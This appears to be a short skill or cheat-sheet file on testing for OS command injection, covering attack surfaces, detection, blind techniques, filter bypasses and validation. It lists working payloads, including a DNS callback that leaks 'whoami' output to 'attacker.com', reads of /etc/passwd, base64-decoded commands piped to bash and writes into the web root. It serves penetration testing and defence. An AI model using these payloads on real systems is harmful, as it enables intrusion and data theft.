---
name: command_injection
description: OS command injection, blind techniques, filter bypass
category: vulnerabilities
---

# Command Injection Testing

## Attack Surface
Command injection occurs when user input is passed to system commands.
- Form inputs (ping, nslookup, traceroute tools)
- File upload names
- HTTP headers (User-Agent, Referer, X-Forwarded-For)
- API parameters passed to system commands

## Methodology
1. **Detection**
   - Inject command separators: `;`, `|`, `&`, `\n`, `` ` ``, `$()`
   - Time-based: `; sleep 5`, `| ping -c 5 127.0.0.1`
   - Output-based: `; echo VULNERABLE`, `| whoami`
   - OOB detection: `; nslookup $(whoami).attacker.com`

2. **Blind Detection**
   - Use time-based payloads with significant delays
   - OOB exfiltration via DNS to controlled server
   - Write output to web-accessible directory: `; echo test > /var/www/html/evidence.txt`

3. **Bypass Methods**
   - Space filtering: `${IFS}`, `<`, `%09`, `{cmd1,cmd2}`
   - Blacklist bypass: `who$@ami`, `who''ami`, `c$*at /etc/passwd`
   - Encoding: Base64 encoded commands with `echo | base64 -d | bash`
   - Wildcard expansion: `/???/c* /???/p??????`

## Validation
- Confirmed command output in response body
- Time-based delay exceeds payload duration by >90%
- OOB callback received from target
- File creation/write confirmed via second request
